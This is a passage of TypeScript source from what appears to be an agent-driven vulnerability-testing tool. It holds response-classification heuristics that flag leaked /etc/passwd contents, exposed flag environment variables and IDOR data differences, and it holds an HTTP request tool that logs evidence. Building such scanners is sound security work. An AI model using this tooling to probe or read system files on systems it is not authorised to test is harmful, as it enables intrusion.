    if (lower.includes("root:") && lower.includes("/bin/")) return "PASSWD_LEAK";
    if (/flag=/i.test(body)) return "ENV_FLAG_VAR";
    if (body.length > baselineLength + 50 && status < 400) return "FILE_CONTENT";
  }

  // IDOR: check for data from other users
  if (category === "idor") {
    if (status === 200 && Math.abs(body.length - baselineLength) > 100) return "DIFFERENT_DATA";
    if (status !== baselineStatus && status === 200) return "ACCESS_GRANTED";
  }

  return null;
}

const MAX_RESPONSE_BODY_BYTES = 8192;
const HTTP_REQUEST_TIMEOUT_MS = 10_000;

async function execSendHttpRequest(
  args: Record<string, unknown>,
  ctx: ExploitToolContext,
  start: number
): Promise<{ result: string; evidence?: ToolCallEvidence }> {
  const url = String(args.url);
  const method = String(args.method || "GET").toUpperCase();
  const headers: Record<string, string> = (args.headers as Record<string, string>) || {};
  const body = args.body ? String(args.body) : undefined;

  let statusCode = 0;
  let responseHeaders: Record<string, string> = {};
  let responseBody = "";

  try {
    const resp = await fetch(url, {
      method,
      headers,
      body: method !== "GET" && method !== "HEAD" ? body : undefined,
      signal: AbortSignal.timeout(HTTP_REQUEST_TIMEOUT_MS),
      redirect: "follow",
    });

    statusCode = resp.status;
    responseHeaders = Object.fromEntries(resp.headers.entries());

    // Read body up to limit
    const reader = resp.body?.getReader();
    if (reader) {
      const chunks: Uint8Array[] = [];
      let totalBytes = 0;
      let truncated = false;
      while (true) {
        const { done, value } = await reader.read();
        if (done) break;
        if (totalBytes + value.byteLength > MAX_RESPONSE_BODY_BYTES) {
          chunks.push(value.slice(0, MAX_RESPONSE_BODY_BYTES - totalBytes));
          truncated = true;
          reader.cancel();
          break;
        }
        chunks.push(value);
        totalBytes += value.byteLength;
      }
      const decoder = new TextDecoder("utf-8", { fatal: false });
      responseBody = chunks.map(c => decoder.decode(c, { stream: true })).join("") + decoder.decode();
      if (truncated) responseBody += "\n... [truncated at 8KB]";
    }
  } catch (err: any) {
    const elapsed = Date.now() - start;
    return {
      result: JSON.stringify({ error: err.message || "HTTP request failed", url, method }),
      evidence: {
        toolName: "send_http_request",
        arguments: { url, method },
        resultSummary: `HTTP ${method} ${url}: ERROR — ${err.message}`,
        vulnerable: false,
        confidence: 0,
        executionTimeMs: elapsed,
        timestamp: new Date().toISOString(),
      },
    };
  }

  const elapsed = Date.now() - start;
  const summary = {
    status: statusCode,
    headers: responseHeaders,
    body: responseBody,
    url,
    method,
    executionTimeMs: elapsed,
  };

  return {
    result: truncate(JSON.stringify(summary), 8000),
    evidence: {
      toolName: "send_http_request",
      arguments: { url, method, headers: Object.keys(headers).length > 0 ? headers : undefined },
      resultSummary: `HTTP ${method} ${url}: ${statusCode} (${responseBody.length} bytes)\n${responseBody.slice(0, 4000)}`,
      vulnerable: false,
      confidence: 0,
      httpEvidence: {
        request: `${method} ${url}${body ? `\n\n${body.slice(0, 2000)}` : ""}`,
        response: responseBody.slice(0, 4000),
        timing: elapsed,
      },
      executionTimeMs: elapsed,
      timestamp: new Date().toISOString(),
    },
  };
}
